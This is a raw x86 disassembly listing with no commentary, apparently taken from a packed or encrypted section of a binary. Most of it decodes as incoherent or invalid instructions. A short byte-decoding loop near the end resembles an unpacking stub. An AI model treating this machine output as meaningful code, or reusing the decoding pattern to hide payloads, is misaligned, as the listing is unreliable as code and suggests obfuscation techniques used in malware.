  40312f:	dec    ecx
  403130:	int3   
  403131:	popa   
  403132:	pop    eax
  403133:	mov    ss,WORD PTR [ecx-0x1]
  403136:	mov    al,0xaf
  403138:	jno    0x4031b5
  40313a:	imul   ebx,DWORD PTR [ebx-0x56],0xffffffd5
  40313e:	lea    esi,[eax-0x1b1dc28f]
  403144:	mov    ch,0xda
  403146:	xchg   esp,eax
  403147:	loop   0x4030dc
  403149:	into   
  40314a:	stos   BYTE PTR es:[edi],al
  40314b:	cdq    
  40314c:	sub    al,BYTE PTR [ecx+0x182d46af]
  403152:	push   esi
  403153:	sub    dh,al
  403155:	and    al,0x1b
  403157:	push   cs
  403158:	dec    esp
  403159:	out    0x40,al
  40315b:	jmp    0x403171
  40315d:	inc    esi
  40315e:	pop    eax
  40315f:	push   esi
  403160:	rcl    BYTE PTR [eax-0x18e8f4ae],cl
  403166:	xlat   BYTE PTR ds:[ebx]
  403167:	push   0x76d3311c
  40316c:	xlat   BYTE PTR ds:[ebx]
  40316d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316e:	pop    es
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x7d0f9587
  403185:	mov    ch,0x3e
  403187:	adc    eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	clc    
  40318f:	das    
  403190:	xor    ebx,DWORD PTR [esi+0x22d60a18]
  403196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403197:	mov    al,ds:0xa97a579d
  40319c:	test   DWORD PTR [eax-0x36],edi
  40319f:	lods   al,BYTE PTR ds:[esi]
  4031a0:	sbb    BYTE PTR [ecx],dh
  4031a2:	mov    ds:0x3ead0770,eax
  4031a7:	and    eax,0x952d319a
  4031ac:	jb     0x4031b9
  4031ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031af:	ror    DWORD PTR [edx+0x22f04f31],0x62
  4031b6:	fcmovnb st,st(6)
  4031b8:	dec    esi
  4031b9:	in     al,dx
  4031ba:	mov    dh,0x5d
  4031bc:	xor    dh,BYTE PTR [esi+ebx*8-0x13]
  4031c0:	(bad)  
  4031c1:	adc    dh,BYTE PTR [edx]
  4031c3:	data16 or BYTE PTR [edi-0x75],dl
  4031c7:	sbb    edi,ebx
  4031c9:	aaa    
  4031ca:	mov    al,0x8b
  4031cc:	sbb    eax,0x3edc4f8f
  4031d1:	cmp    eax,0xb176a056
  4031d6:	ror    BYTE PTR [esi],cl
  4031d8:	mov    al,0x7f
  4031da:	mov    WORD PTR [esi+0x2776542e],cs
  4031e0:	loope  0x40320d
  4031e2:	sbb    eax,edx
  4031e4:	adc    eax,0x47e63401
  4031e9:	aam    0xe5
  4031eb:	xor    DWORD PTR [eax+edi*2-0x42380a2b],eax
  4031f2:	mov    bh,bl
  4031f4:	adc    bh,dh
  4031f6:	rcl    DWORD PTR [eax+eax*1-0x17],1
  4031fa:	xchg   esp,ecx
  4031fc:	xchg   esp,eax
  4031fd:	xor    al,0x53
  4031ff:	cmp    ecx,DWORD PTR [eax]
  403201:	jns    0x403203
  403203:	bound  ebp,QWORD PTR [ebx-0x5c]
  403206:	add    eax,0xe2018c5d
  40320b:	mov    al,0xa5
  40320d:	pop    ecx
  40320e:	cs adc al,0x8b
  403211:	aas    
  403212:	jl     0x403235
  403214:	mov    edx,0x9311045d
  403219:	icebp  
  40321a:	std    
  40321b:	fimul  WORD PTR [ebx+0x1444baf0]
  403221:	fild   WORD PTR [eax]
  403223:	mov    ds:0x8178af70,al
  403228:	jae    0x40323e
  40322a:	loope  0x403279
  40322c:	stos   DWORD PTR es:[edi],eax
  40322d:	jne    0x4031cc
  40322f:	and    DWORD PTR [edi],ecx
  403231:	ret    0x1c3
  403234:	scas   eax,DWORD PTR es:[edi]
  403235:	cmp    esp,esp
  403237:	mov    eax,0xd3a67485
  40323c:	dec    ecx
  40323d:	inc    esp
  40323e:	icebp  
  40323f:	aas    
  403240:	mov    eax,0x177fcc49
  403245:	cmp    al,0x38
  403247:	fadd   st(6),st
  403249:	(bad)  
  40324a:	xor    edx,DWORD PTR [ecx]
  40324c:	mov    dh,0xe8
  40324e:	in     eax,0x4c
  403250:	out    dx,eax
  403251:	sub    DWORD PTR [edi+eax*8+0x38],ecx
  403255:	mov    dh,BYTE PTR [edi]
  403257:	dec    eax
  403258:	es in  al,0x88
  40325b:	xor    ah,BYTE PTR [eax+0x56]
  40325e:	pop    edi
  40325f:	xor    al,bh
  403261:	jecxz  0x4032d6
  403263:	jmp    0xf5ca:0x1de0e74b
  40326a:	call   0xc06ff2fc
  40326f:	add    al,0xa2
  403271:	xchg   ebp,eax
  403272:	adc    eax,0x2d641f60
  403277:	(bad)  
  403278:	test   BYTE PTR [edx+esi*4-0x921efef],0xa1
  403280:	xor    eax,0x435335a0
  403285:	shl    BYTE PTR [eax],1
  403287:	outs   dx,DWORD PTR ds:[esi]
  403288:	inc    ecx
  403289:	and    DWORD PTR [esi+eiz*1+0x37],esi
  40328d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40328e:	sub    edi,DWORD PTR [ebp+0x2b50bdd9]
  403294:	fcomp  DWORD PTR [esi-0x47f636d7]
  40329a:	sahf   
  40329b:	adc    ebp,esi
  40329d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40329e:	mov    ds:0xacee9c60,al
  4032a3:	nop
  4032a4:	sbb    eax,0x72723677
  4032a9:	xor    ecx,ebx
  4032ab:	sub    bl,bh
  4032ad:	lea    ecx,[esi]
  4032af:	push   esp
  4032b0:	sar    DWORD PTR [ebx],0x92
  4032b3:	add    esi,ebx
  4032b5:	pop    ss
  4032b6:	add    edx,DWORD PTR [ecx-0x31a1df3b]
  4032bc:	jp     0x40324d
  4032be:	push   eax
  4032bf:	rcr    DWORD PTR [edx+0x29],cl
  4032c2:	repz push ebp
  4032c4:	add    DWORD PTR [ebx],eax
  4032c6:	mov    BYTE PTR [eax+0x46],bh
  4032c9:	pop    eax
  4032ca:	sar    eax,0xf7
  4032cd:	stos   BYTE PTR es:[edi],al
  4032ce:	aad    0x7a
  4032d0:	pop    ebp
  4032d1:	test   BYTE PTR [edi-0x5d5babcb],ah
  4032d7:	sbb    al,0xb1
  4032d9:	sub    eax,0xba511d3c
  4032de:	jl     0x403302
  4032e0:	inc    esp
  4032e1:	or     eax,0xb7ab1735
  4032e6:	popa   
  4032e7:	pop    esp
  4032e8:	cmp    ch,0x4b
  4032eb:	mov    eax,0xf2cea51f
  4032f0:	lds    ecx,FWORD PTR [ebx-0x22b43148]
  4032f6:	addr16 xchg ebx,eax
  4032f8:	xchg   edi,eax
  4032f9:	and    ebx,DWORD PTR [ebx-0x2d221ab0]
  4032ff:	mov    ds:0x37e38b98,al
  403304:	and    ebp,DWORD PTR [edi-0x71]
  403307:	and    DWORD PTR ds:0x891a33cc,esp
  40330d:	es loope 0x40329f
  403310:	stos   DWORD PTR es:[edi],eax
  403311:	retf   0xe702
  403314:	loopne 0x403321
  403316:	aam    0x1c
  403318:	dec    esi
  403319:	pop    ebp
  40331a:	fld    TBYTE PTR [eax-0x78]
  40331d:	mov    bl,0x7f
  40331f:	xchg   esp,eax
  403320:	sahf   
  403321:	mov    ?,WORD PTR [esp+edi*8]
  403324:	push   cs
  403325:	push   esp
  403326:	fdiv   QWORD PTR [ecx]
  403328:	ret    
  403329:	mov    DWORD PTR [esi-0x6],esp
  40332c:	retf   
  40332d:	jnp    0x4032bf
  40332f:	jns    0x4032d0
  403331:	xlat   BYTE PTR ds:[ebx]
  403332:	call   0xb4e3:0x3c401c16
  403339:	pop    ds
  40333a:	(bad)  
  40333b:	fimul  DWORD PTR [eax]
  40333d:	pop    edi
  40333e:	fsub   DWORD PTR [esi+0x2c]
  403341:	call   FWORD PTR [edi+edx*8-0x4b]
  403345:	arpl   WORD PTR [edx+0x55401530],dx
  40334b:	or     BYTE PTR [edi],ah
  40334d:	mov    edx,0x583caccb
  403352:	cmp    esp,esp
  403354:	cdq    
  403355:	std    
  403356:	into   
  403357:	inc    esi
  403358:	rol    BYTE PTR [ebp+ebx*8-0x1e],0x1e
  40335d:	mov    eax,0x5a22586e
  403362:	jae    0x40336a
  403364:	inc    ebx
  403365:	nop
  403366:	addr16 in al,0x69
  403369:	ja     0x4033a1
  40336b:	adc    ebp,DWORD PTR [edx+ebp*1-0x68013fd7]
  403372:	cs ss cmp al,0x26
  403376:	cli    
  403377:	jo     0x40336b
  403379:	call   0x2463:0x366c4682
  403380:	xlat   BYTE PTR ds:[ebx]
  403381:	call   0xd745:0x5d9ebae8
  403388:	mov    edi,0x5a971a97
  40338d:	out    dx,eax
  40338e:	hlt    
  40338f:	mov    al,ds:0x9545a7a9
  403394:	sub    bh,dl
  403396:	fld    DWORD PTR [edi+0xd]
  403399:	jmp    0xec870b15
  40339e:	xchg   esp,esp
  4033a0:	mov    al,0x28
  4033a2:	ds cdq 
  4033a4:	(bad)  
  4033a5:	neg    BYTE PTR [ecx+0x5d378bc6]
  4033ab:	loopne 0x403360
  4033ad:	in     al,dx
  4033ae:	addr16 test dl,al
  4033b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033b2:	or     BYTE PTR [edi-0x27f82a1],bh
  4033b8:	(bad)  
  4033ba:	ss aas 
  4033bc:	popa   
  4033bd:	(bad)
  4033c1:	mov    ds:0x9e4b2bd3,al
  4033c6:	js     0x4033f9
  4033c8:	out    0x8f,al
  4033ca:	dec    esi
  4033cb:	xchg   BYTE PTR [esi-0x5e20af8],ch
  4033d1:	mov    bl,0xee
  4033d3:	jnp    0x403418
  4033d5:	in     eax,0xe0
  4033d7:	inc    ebp
  4033d8:	frstor [ecx+0x3b]
  4033db:	push   ebp
  4033dc:	fwait
  4033dd:	cwde   
  4033de:	fist   WORD PTR [edx]
  4033e0:	mov    esi,DWORD PTR [ebp+0x6dbbbdce]
  4033e6:	cmp    dl,BYTE PTR [eax-0x54d307ff]
  4033ec:	cmp    cl,BYTE PTR [eax-0x51]
  4033ef:	fpatan 
  4033f1:	shl    BYTE PTR [edi],cl
  4033f3:	fwait
  4033f4:	int3   
  4033f5:	sub    esp,edi
  4033f7:	mov    al,ds:0x7e35acc7
  4033fc:	pop    ebx
  4033fd:	cmp    DWORD PTR [edi-0x1c097b3],ebp
  403403:	inc    ebx
  403404:	mov    ebx,0x94258b68
  403409:	pop    esi
  40340a:	pop    ecx
  40340b:	pop    edx
  40340c:	mov    cl,0x71
  40340e:	jl     0x403400
  403410:	fld    TBYTE PTR [esp+eiz*8-0x5c946d92]
  403417:	pop    ecx
  403418:	cmc    
  403419:	in     al,0xa6
  40341b:	iret   
  40341c:	ja     0x4033eb
  40341e:	mov    ch,dh
  403420:	push   eax
  403421:	jne    0x403459
  403423:	mov    dh,0xa6
  403425:	push   edx
  403426:	repnz fs mov ecx,0x5d658fa5
  40342d:	cmp    eax,DWORD PTR [ebx]
  40342f:	mov    ch,0x55
  403431:	jae    0x4033fc
  403433:	hlt    
  403434:	call   0xb161:0xeb379feb
  40343b:	add    ebx,DWORD PTR [ebx+eax*1-0x1b]
  40343f:	jo     0x40342b
  403441:	inc    ebp
  403442:	das    
  403443:	mov    ebp,0x54ff9b03
  403448:	xchg   edi,eax
  403449:	sti    
  40344a:	push   edi
  40344b:	fnstsw WORD PTR [edi]
  40344d:	dec    ecx
  40344e:	jb     0x4033ff
  403450:	clc    
  403451:	aas    
  403452:	dec    esp
  403453:	mov    BYTE PTR [esi+0x50],cl
  403456:	jb     0x4033d9
  403458:	loope  0x403496
  40345a:	idiv   DWORD PTR [esi-0xc3b3e7e]
  403460:	icebp  
  403461:	cmp    esp,edx
  403463:	add    eax,0x1d500ce3
  403468:	pushf  
  403469:	dec    ecx
  40346a:	xchg   DWORD PTR [ebx+eiz*1-0x54],edx
  40346e:	mov    esp,0xc397a7bd
  403473:	enter  0x5e12,0xeb
  403477:	sbb    al,0x67
  403479:	fisubr DWORD PTR [eax]
  40347b:	xchg   ebx,edx
  40347d:	pop    ebx
  40347e:	add    ecx,DWORD PTR [ebx+0x4203ad67]
  403484:	mov    eax,0xd53bc76b
  403489:	lods   eax,DWORD PTR ds:[esi]
  40348a:	adc    BYTE PTR [edi+esi*1+0x50],dl
  40348e:	mov    cl,0xb
  403490:	and    esp,ebx
  403492:	cmp    cl,BYTE PTR [eax]
  403494:	xchg   esi,eax
  403495:	test   al,0x63
  403497:	int    0x40
  403499:	(bad)  
  40349a:	repz enter 0x8d91,0x62
  40349f:	in     al,dx
  4034a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a1:	ds jbe 0x4034f8
  4034a4:	call   0xa5eff056
  4034a9:	inc    ebp
  4034aa:	in     eax,dx
  4034ab:	sbb    eax,0xf92938ee
  4034b0:	inc    ebx
  4034b1:	xor    al,0x6b
  4034b3:	int    0x26
  4034b5:	mov    dh,0x88
  4034b7:	hlt    
  4034b8:	mov    dl,0x7d
  4034ba:	je     0x40347a
  4034bc:	jne    0x40346d
  4034be:	stos   DWORD PTR es:[edi],eax
  4034bf:	and    eax,0xa5862f4a
  4034c4:	pop    ecx
  4034c5:	popf   
  4034c6:	ret    0xa100
  4034c9:	test   DWORD PTR [esi+0x49],ebp
  4034cc:	fldenv [esi+0xb]
  4034cf:	mov    ecx,0xcf0749fa
  4034d4:	jbe    0x403474
  4034d6:	mov    dh,0xd9
  4034d8:	and    BYTE PTR [edi+ebp*4],ch
  4034db:	fs mov ch,0xe1
  4034de:	sahf   
  4034df:	mov    ecx,0xad9bacec
  4034e4:	mov    edi,0x234d2aa2
  4034e9:	xor    al,ah
  4034eb:	outs   dx,DWORD PTR ds:[esi]
  4034ec:	pusha  
  4034ed:	in     al,0x7d
  4034ef:	call   0xf388:0xd64cf38b
  4034f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f7:	add    DWORD PTR [esi+0x62],edx
  4034fa:	jmp    0x668f:0x629bd7e5
  403501:	in     eax,dx
  403502:	adc    ch,BYTE PTR [esp+ecx*4-0x77]
  403506:	arpl   WORD PTR [esi+0x12],ax
  403509:	shl    BYTE PTR [edi+edx*8+0x7],0x34
  40350e:	(bad)  
  40350f:	mov    dh,0xf4
  403511:	jae    0x403580
  403513:	jecxz  0x40358e
  403515:	imul   ebp,DWORD PTR [edi+0xef34d2e],0x629376e1
  40351f:	gs mov esp,esi
  403522:	fisub  WORD PTR [esi]
  403524:	cs dec edx
  403526:	out    dx,eax
  403527:	add    edi,esi
  403529:	mov    esi,DWORD PTR [ebp+0x8]
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x40353d
  403544:	sbb    bh,BYTE PTR [ecx+0x7012555f]
  40354a:	jo     0x4034e3
  40354c:	jge    0x4035be
  40354e:	jo     0x40351c
  403550:	add    al,0xbd
  403552:	or     ah,BYTE PTR [ebp-0x70]
  403555:	xchg   ecx,eax
  403556:	mov    eax,0x68a03832
  40355b:	cli    
  40355c:	ret    0x1ff9
  40355f:	mov    ecx,0xf59098d8
  403564:	pop    ss
  403565:	cwde   
  403566:	out    dx,al
  403567:	(bad)  
  403568:	push   cs
  403569:	dec    edi
  40356a:	dec    eax
  40356b:	shr    BYTE PTR [ebp-0xc1720b4],cl
  403571:	cmp    eax,ebx
  403573:	inc    esp
  403574:	mov    gs,WORD PTR [esi+0x70e9e2fc]
  40357a:	stos   BYTE PTR es:[edi],al
  40357b:	sbb    dl,dl
  40357d:	aaa    
  40357e:	jo     0x403575
  403580:	pusha  
  403581:	lods   al,BYTE PTR ds:[esi]
  403582:	aam    0x2e
  403584:	aad    0x76
  403586:	inc    esp
  403587:	sbb    BYTE PTR [ebx-0x5b794581],dl
  40358d:	jp     0x40359a
  40358f:	jmp    0xf77b:0x67078eda
  403596:	xchg   ecx,eax
  403597:	mov    ds:0xea09c041,eax
  40359c:	mov    ecx,DWORD PTR [eax-0x31047d96]
  4035a2:	jne    0x4035f0
  4035a4:	add    edi,edx
  4035a6:	ins    BYTE PTR es:[edi],dx
  4035a7:	test   DWORD PTR [esi],ebx
  4035a9:	aaa    
  4035aa:	jle    0x4035e0
  4035ac:	nop
  4035ad:	pop    ecx
  4035ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035af:	lds    edi,FWORD PTR [ecx]
  4035b1:	jo     0x40357b
  4035b3:	inc    ebp
  4035b4:	in     al,dx
  4035b5:	leave  
  4035b6:	sbb    esp,eax
  4035b8:	sar    al,cl
  4035ba:	pop    esi
  4035bb:	xchg   si,ax
  4035bd:	in     al,dx
  4035be:	adc    dh,bl
  4035c0:	mov    ebx,0x5fc9cb6
  4035c5:	mov    al,0x72
  4035c7:	rol    BYTE PTR [ecx-0x6f],1
  4035ca:	sbb    DWORD PTR [edx],ebx
  4035cc:	cmp    esp,DWORD PTR [edi+eax*2-0x4187a770]
  4035d3:	aas    
  4035d4:	stos   DWORD PTR es:[edi],eax
  4035d5:	push   ecx
  4035d6:	cmp    DWORD PTR [edi+0x23],eax
  4035d9:	fmul   QWORD PTR [edx+0x6633ef0c]
  4035df:	faddp  st(5),st
  4035e1:	stc    
  4035e2:	iret   
  4035e3:	sbb    BYTE PTR [eax-0x3],al
  4035e6:	mov    es,WORD PTR [ebp+0x57ce6270]
  4035ec:	xor    bl,BYTE PTR [ebp+0x49]
  4035ef:	fcmovu st,st(2)
  4035f1:	stos   DWORD PTR es:[edi],eax
  4035f2:	sub    esp,edx
  4035f4:	jmp    0xb2862963
  4035f9:	lahf   
  4035fa:	repz imul edx,DWORD PTR [ebx],0x1885d87d
  403601:	(bad)  
  403602:	pop    edx
  403603:	mov    esp,DWORD PTR [edi+0x62]
  403606:	loopne 0x403676
  403608:	fwait
  403609:	add    edx,0xfffffff4
  40360c:	jbe    0x403647
  40360e:	and    BYTE PTR [ecx-0x30],cl
  403611:	je     0x403682
  403613:	loope  0x4035a5
  403615:	and    BYTE PTR [ebx-0x6550f7be],0x31
  40361c:	sbb    al,0xf2
  40361e:	ins    BYTE PTR es:[edi],dx
  40361f:	sub    DWORD PTR [ebx],esi
  403621:	shl    DWORD PTR [ebp-0x7b88d065],cl
  403627:	dec    esp
  403628:	outs   dx,BYTE PTR ds:[esi]
  403629:	add    al,0x3a
  40362b:	sbb    BYTE PTR [edx-0xb446ff8],0x4
  403632:	sbb    DWORD PTR [ecx+0xe66492b],0xffffffc0
  403639:	xchg   BYTE PTR [esi],cl
  40363b:	or     ebx,DWORD PTR [edx]
  40363d:	test   BYTE PTR [ecx-0x3607444a],ah
  403643:	leave  
  403644:	dec    esi
  403645:	loope  0x4035d3
  403647:	cmpxchg BYTE PTR [edi-0x575783db],dl
  40364e:	mov    al,0x54
  403650:	ja     0x4036a8
  403652:	jge    0x4036af
  403654:	jecxz  0x403634
  403656:	sbb    esi,DWORD PTR [ebx+edi*8-0x6746ddf2]
  40365d:	jmp    0xcfbb:0x3cc6ec1a
  403664:	lock in al,dx
  403666:	mov    esi,0xf56be72d
  40366b:	jmp    0x5cd03bb2
  403670:	or     DWORD PTR [ebp-0x5a],0x5a
  403674:	add    al,0x5a
  403676:	(bad)  
  403677:	stos   DWORD PTR es:[edi],eax
  403678:	imul   edx,edx,0x4067fe1e
  40367e:	xor    eax,DWORD PTR [edx]
  403680:	dec    edi
  403681:	je     0x4036f1
  403683:	shl    DWORD PTR [edx+ebp*2+0x26a08d8],cl
  40368a:	test   DWORD PTR ds:0xf6d1c2c,ebx
  403690:	pop    esp
  403691:	xchg   edi,eax
  403692:	xchg   edi,eax
  403693:	xor    ch,BYTE PTR ds:0xc7f03e0b
  403699:	fsub   DWORD PTR [edx]
  40369b:	push   eax
  40369c:	aad    0x61
  40369e:	lds    esi,FWORD PTR [edi-0x58]
  4036a1:	(bad)  
  4036a2:	popa   
  4036a3:	cld    
  4036a4:	cmp    BYTE PTR [ebx-0x1],dl
  4036a7:	mov    ecx,0xb9ff6377
  4036ac:	sub    DWORD PTR [edi+ecx*8-0x7c],ebx
  4036b0:	int    0x91
  4036b2:	sbb    BYTE PTR [edi-0x1d6e1dc4],ah
  4036b8:	mov    al,ds:0xb51f13fa
  4036bd:	push   eax
  4036be:	inc    ecx
  4036bf:	jae    0x403691
  4036c1:	test   ebx,edx
  4036c3:	shl    ch,cl
  4036c5:	push   ebx
  4036c6:	js     0x40364b
  4036c8:	rol    ebx,cl
  4036ca:	xchg   edi,eax
  4036cb:	inc    esp
  4036cc:	add    edi,DWORD PTR [ecx]
  4036ce:	(bad)  
  4036d0:	fwait
  4036d1:	jnp    0x4036f5
  4036d3:	(bad)  [edx-0x19d4f876]
  4036d9:	fstp   DWORD PTR [edi]
  4036db:	push   edx
  4036dc:	push   0x29
  4036de:	pop    ebp
  4036df:	fs pop esi
  4036e1:	inc    eax
  4036e2:	inc    esp
  4036e3:	lea    eax,[eax-0x2a]
  4036e6:	or     eax,0x4d549da8
  4036eb:	and    al,0x5d
  4036ed:	loop   0x403734
  4036ef:	arpl   WORD PTR [esp+eax*1+0x43],di
  4036f3:	test   al,0x82
  4036f5:	sub    ecx,edx
  4036f7:	mov    bh,BYTE PTR [esi]
  4036f9:	mul    edi
  4036fb:	add    DWORD PTR [eax-0x19],esi
  4036fe:	retf   0x4c7a
  403701:	cmp    esi,DWORD PTR [edx]
  403703:	pop    esi
  403704:	fmul   DWORD PTR [esi-0x15]
  403707:	(bad)  
  403708:	mov    bh,0x20
  40370a:	jmp    0x1614:0x108337ad
  403711:	mov    al,0xf6
  403713:	sbb    ebx,esi
  403715:	fwait
  403716:	ss icebp 
  403718:	pop    edx
  403719:	daa    
  40371a:	lods   al,BYTE PTR ds:[esi]
  40371b:	aad    0xaa
  40371d:	fbld   TBYTE PTR [ebp-0x691d01e]
  403723:	mov    bh,0xb7
  403725:	add    BYTE PTR [ecx-0x4f5215dd],bl
  40372b:	cmp    al,0xe6
  40372d:	(bad)  [esi-0x4a4f5d15]
  403733:	adc    DWORD PTR [esi-0x66],eax
  403736:	and    ebp,edi
  403738:	lods   eax,DWORD PTR ds:[esi]
  403739:	jmp    0xaa98:0x2ce64232
  403740:	xchg   DWORD PTR [ebp+0x52],ebp
  403743:	in     eax,dx
  403744:	dec    eax
  403745:	pusha  
  403746:	in     eax,0x6e
  403748:	or     ch,BYTE PTR [ebp+ecx*8-0x5c]
  40374c:	adc    eax,esi
  40374e:	sar    al,0x81
  403751:	push   eax
  403752:	(bad)  
  403753:	jae    0x403794
  403755:	call   0x6a4e4964
  40375a:	pop    ecx
  40375b:	xchg   esp,eax
  40375c:	inc    edi
  40375d:	pop    ebp
  40375e:	frstor [ebp-0x36]
  403761:	ins    BYTE PTR es:[edi],dx
  403762:	add    al,0x9
  403764:	in     eax,0x43
  403766:	hlt    
  403767:	data16 mul BYTE PTR [edi+0x373287d7]
  40376e:	adc    DWORD PTR [esi+ebp*1+0x40],edx
  403772:	call   0x5e36:0x7c573a57
  403779:	enter  0x28c7,0xf7
  40377d:	xchg   ecx,eax
  40377e:	mov    al,fs:0x21c9622c
  403784:	imul   edx,DWORD PTR [ebx-0x6083a1fc],0xffffff94
  40378b:	out    0xe2,eax
  40378d:	push   edx
  40378e:	mov    eax,0xefa1fb5
  403793:	addr16 cwde 
  403795:	mov    al,0xa8
  403797:	or     eax,0xdd504519
  40379c:	sbb    ebx,DWORD PTR ss:[edi-0x29]
  4037a0:	xchg   esi,esp
  4037a2:	sub    eax,esp
  4037a4:	and    BYTE PTR [edx],bh
  4037a6:	xor    dh,dl
  4037a8:	rcr    edi,cl
  4037aa:	sar    bl,1
  4037ac:	mov    ebx,0x9ee4cd8
  4037b1:	(bad)  
  4037b2:	pushf  
  4037b3:	loopne 0x4037dc
  4037b5:	bound  esi,QWORD PTR ds:0xccb6c817
  4037bb:	sbb    eax,0x64abbc71
  4037c0:	addr16 adc eax,0xda945b9a
  4037c6:	mov    eax,0xd492021d
  4037cb:	inc    esp
  4037cc:	mov    al,0x6c
  4037ce:	loop   0x4037df
  4037d0:	lods   eax,DWORD PTR ds:[esi]
  4037d1:	push   edi
  4037d2:	mov    BYTE PTR [ebx],0x47
  4037d5:	into   
  4037d6:	push   0x9eb79f76
  4037db:	adc    eax,0xa056db6e
  4037e0:	cmc    
  4037e1:	sbb    dl,BYTE PTR [ecx-0x26d9b111]
  4037e7:	push   edx
  4037e8:	imul   edx,DWORD PTR [ebp+eiz*2-0x7106e782],0xffffff98
  4037f0:	test   al,0xa4
  4037f2:	cmp    DWORD PTR [eax-0x3f313dc4],ecx
  4037f8:	ret    0xb3fc
  4037fb:	stos   DWORD PTR es:[edi],eax
  4037fc:	push   es
  4037fd:	push   cs
  4037fe:	std    
  4037ff:	iret   
  403800:	fldenv [ebx+0x7d]
  403803:	dec    esi
  403804:	mov    ah,0x2a
  403806:	pop    ecx
  403807:	cmp    ch,ah
  403809:	mov    BYTE PTR [edx+0x73c8412b],0x9e
  403810:	and    BYTE PTR [edi],bh
  403812:	fmul   st,st(1)
  403814:	adc    dl,bl
  403816:	out    0x9a,al
  403818:	mov    al,ds:0xb7a935a7
  40381d:	push   0x37
  40381f:	xor    edi,esp
  403821:	lods   al,BYTE PTR ds:[esi]
  403822:	xchg   DWORD PTR [ebp+0x10e4b33a],edi
  403828:	iret   
  403829:	adc    bh,BYTE PTR [eax+0x32bf345d]
  40382f:	sub    BYTE PTR [edi-0x35a8b940],0x75
  403836:	test   DWORD PTR [eax],esi
  403838:	daa    
  403839:	ss or  edi,ecx
  40383c:	in     al,0xfa
  40383e:	ds pop ds
  403840:	ds mov DWORD PTR ds:[edi-0x2f05eef8],ebx
  403848:	icebp  
  403849:	cmc    
  40384a:	mov    eax,0xc1fa142c
  40384f:	cmp    DWORD PTR [esi],ebp
  403851:	nop
  403852:	pop    eax
  403853:	jmp    0xb4f0:0x2b56230d
  40385a:	iret   
  40385b:	mov    dl,0xaa
  40385d:	xor    eax,0xa81eae11
  403862:	xchg   ebp,eax
  403863:	jae    0x403875
  403865:	mul    ah
  403867:	arpl   bp,di
  403869:	imul   ebp,DWORD PTR [eax-0x1e],0xffffffc5
  40386d:	add    ecx,DWORD PTR [eax+0x3b]
  403870:	mov    al,ds:0xa587bfef
  403875:	cmp    esi,DWORD PTR [esi+0x7f9d7bde]
  40387b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40387d:	(bad)  
  40387e:	mov    edi,0x60d0d461
  403883:	mul    edx
  403885:	sub    cl,BYTE PTR [esi+ecx*2+0x14]
  403889:	das    
  40388a:	mov    ds:0x4ca8fe7f,al
  40388f:	mov    ch,0x12
  403891:	out    dx,al
  403892:	push   eax
  403893:	mov    BYTE PTR [esi-0x49],cl
  403896:	aam    0xfd
  403898:	cmp    ah,bl
  40389a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40389b:	mov    bh,0x1
  40389d:	mov    cl,dl
  40389f:	loope  0x403909
  4038a1:	cdq    
  4038a2:	mov    cl,0x16
  4038a4:	ret    0x8774
  4038a7:	add    al,0xa
  4038a9:	imul   eax,esp,0x7ccf3199
  4038af:	fisubr WORD PTR [esi-0x51]
  4038b2:	jmp    0x40387b
  4038b4:	inc    esp
  4038b5:	push   ebp
  4038b6:	outs   dx,DWORD PTR ds:[esi]
  4038b7:	pop    esp
  4038b8:	inc    ebp
  4038b9:	ss ret 0x7f3f
  4038bd:	mov    dl,0x3a
  4038bf:	lods   eax,DWORD PTR ds:[esi]
  4038c0:	jne    0x403929
  4038c2:	mov    edi,DWORD PTR [ebp-0x478f505b]
  4038c8:	xchg   edx,eax
  4038c9:	retf   0xcc58
  4038cc:	cmp    BYTE PTR [esi+ecx*4],bl
  4038cf:	xchg   DWORD PTR gs:[edi-0x10],edx
  4038d3:	(bad)  
  4038d4:	int    0xbc
  4038d6:	and    bl,BYTE PTR [edx-0x231f1dc]
  4038dc:	pop    ebx
  4038dd:	sub    edx,edi
  4038df:	adc    DWORD PTR [ecx],ebp
  4038e1:	(bad)  
  4038e2:	in     al,dx
  4038e3:	add    dh,BYTE PTR [edx+0x3339a68d]
  4038e9:	rol    DWORD PTR [ebx],0xc2
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43432d,0x11
  403938:	cmp    DWORD PTR ds:0x43432d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43432d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43427a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432b26
  403960:	mov    eax,ds:0x43432d
  403965:	dec    eax
